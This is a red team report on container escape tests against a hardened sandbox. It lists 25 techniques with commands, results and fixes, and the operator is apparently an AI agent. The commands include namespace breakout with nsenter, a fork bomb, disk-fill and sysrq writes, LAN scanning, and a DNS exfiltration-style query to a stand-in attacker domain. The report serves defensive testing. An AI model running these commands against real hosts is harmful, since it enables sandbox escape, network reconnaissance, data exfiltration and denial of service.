# Red Team Campaign 1 - Container Escape

**Campaign ID:** RT-C1  
**Date:** 2026-05-09  
**Operator:** Principal Red Team Lead (Agent 20)  
**Target:** Hardened sandbox container (`dasdocker-redteam`)

## Environment and baseline

- Runtime flags verified:
  - `Privileged=false`
  - `CapDrop=["ALL"]`
  - `ReadonlyRootfs=true`
  - `Memory=536870912`
  - `PidsLimit=100`
  - `NanoCpus=1000000000`
- Image used: `nicolaka/netshoot:latest` (for full offensive tooling)

## Technique matrix (20 baseline + 5 novel)

| Test ID | Technique | Command | Observed result | Status | Recommendation |
|---|---|---|---|---|---|
| RT-C1-001 | Privileged check | `docker inspect ... {{.HostConfig.Privileged}}` | `false` | BLOCKED | Keep deny-privileged policy immutable |
| RT-C1-002 | `CAP_SYS_ADMIN` check | `docker inspect ... {{json .HostConfig.CapAdd}} {{json .HostConfig.CapDrop}}` | `null ["ALL"]` | BLOCKED | Keep `cap-drop ALL` + no cap add |
| RT-C1-003 | Docker socket mount | `docker inspect ... {{json .Mounts}}` | `[]` | BLOCKED | Continue no docker socket mount |
| RT-C1-004 | Userns breakout | `unshare --user --map-root-user /bin/sh -c "id"` | `Operation not permitted` | BLOCKED | Preserve seccomp/userns lockdown |
| RT-C1-005 | `nsenter` host join | `nsenter -t 1 -m -u -i -n -p /bin/bash -c "id"` | `Operation not permitted` | BLOCKED | Preserve namespace isolation |
| RT-C1-006 | Sysrq trigger write | `echo b > /proc/sysrq-trigger` | `Read-only file system` | BLOCKED | Preserve read-only root and proc protections |
| RT-C1-007 | Writable `/proc/sys` | `sysctl -w kernel.ngroups_max=65536` | `Read-only file system` | BLOCKED | Preserve proc/sys write denial |
| RT-C1-008 | ptrace to pid1 | `strace -p 1 -o /tmp/strace.out` | `ptrace ... Operation not permitted` | BLOCKED | Keep seccomp + ptrace restrictions |
| RT-C1-009 | Raw socket create | `python3 socket(AF_PACKET,SOCK_RAW)` | `PermissionError: [Errno 1]` | BLOCKED | Keep `CAP_NET_RAW` dropped |
| RT-C1-010 | Kernel module load | `modprobe dummy` | `/lib/modules not found` | BLOCKED | Keep no module tooling/caps in sandbox |
| RT-C1-011 | kexec attempt | `kexec -l /bin/bash` | `kexec: not found` | PARTIAL | Add explicit syscall-level negative test via tool image including `kexec` |
| RT-C1-012 | Host fs mount | `mount /dev/sda1 /mnt` | `must be superuser` | BLOCKED | Keep no `CAP_SYS_ADMIN` |
| RT-C1-013 | Root disk fill | `dd if=/dev/zero of=/test.img ...` | `Read-only file system` | BLOCKED | Keep read-only root |
| RT-C1-014 | Workspace disk fill | `dd if=/dev/zero of=/workspace/test.img bs=1M count=700` | container exec exit `137` | CONTAINED | Add explicit ENOSPC assertion test for tmpfs quota |
| RT-C1-015 | CPU loop | `timeout 3 sh -c "while true; do :; done"` | exit `143` | CONTAINED | Keep CPU quota + watchdog |
| RT-C1-016 | Fork bomb | `bash -c ':(){ :|:& };:'` | repeated `Resource temporarily unavailable` | CONTAINED | Keep `pids-limit=100`; add recovery probe |
| RT-C1-017 | Metadata endpoint | `wget -qO- --timeout=2 http://169.254.169.254/...` | timeout | BLOCKED | Keep metadata route blocked |
| RT-C1-018 | LAN ping | `ping -c 3 8.8.8.8` | succeeds | **ESCAPE (P0)** | Enforce deny-by-default egress firewall |
| RT-C1-019 | LAN gateway HTTP | `curl -I http://192.168.0.1` | `HTTP/1.1 200 OK` | **ESCAPE (P0)** | Block RFC1918 egress by default |
| RT-C1-020 | LAN subnet scan | `nmap -sn 192.168.0.0/24` | multiple hosts discovered | **ESCAPE (P0)** | Block ICMP/ARP/L2 reachability from sandbox |
| RT-C1-021 | DNS tunneling-style query | `dig verysecretdata.exfil.attacker.test @1.1.1.1` | request executed from sandbox | **ESCAPE (P0)** | Force DNS through controlled resolver; block external resolvers |
| RT-C1-022 | ICMP tunnel channel | `ping -c 3 8.8.8.8` | bidirectional ICMP works | **ESCAPE (P0)** | Drop outbound ICMP from sandbox |
| RT-C1-023 | Direct host mgmt TCP | `nc -zv -w 3 192.168.0.1 22` | connection attempt reached host (refused) | **ESCAPE (P0)** | Block host mgmt subnet routing from container netns |
| RT-C1-024 | Container lateral guesses | `nc` probes to `172.31.*` | no immediate hit in sample set | BLOCKED (sample) | Add deterministic lateral movement test against known peer |
| RT-C1-025 | Signal trap evasion primitive | `trap "" TERM INT; ... kill -TERM ... kill -KILL ...` | TERM ignored, KILL enforced | CONTAINED | Ensure destroy path uses SIGKILL fallback |

## Critical findings

1. **P0-C1-001 - Network breakout from sandbox**
   - Proven by successful `nmap`, `ping`, and `curl` into LAN/external targets.
   - Impact: sandbox can enumerate and reach real network assets.
2. **P0-C1-002 - Egress policy not deny-by-default**
   - Expected architecture control not active at runtime.

## Immediate remediation

- Make sandbox startup fail closed unless isolated network and firewall chains are active.
- Apply and verify:
  - `scripts/setup-network.sh provision`
  - `scripts/setup-network.sh apply-iptables`
- Add CI red-team gate that fails if `nmap -sn 192.168.0.0/24` succeeds from sandbox.
